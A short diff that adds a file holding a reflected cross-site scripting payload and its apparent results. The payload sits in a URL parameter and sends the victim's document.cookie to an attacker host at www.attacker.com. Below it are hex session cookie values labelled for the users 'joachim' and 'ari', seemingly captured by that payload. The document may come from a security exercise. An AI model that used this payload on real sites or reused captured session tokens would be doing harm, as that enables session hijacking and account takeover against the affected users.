@@ -1,0 +1,6 @@
+url?user=<script>document.location='http://www.attacker.com/cgibin/cookie.cgi?foo='+document.cookie</script>
+
+joachim cookie: 98D7AE303897749C567D93169ED3F49B
+                98D7AE303897749C567D93169ED3F49B
+
+ari cookie: B6BA7760C03FBA3468653E5AF4E27209
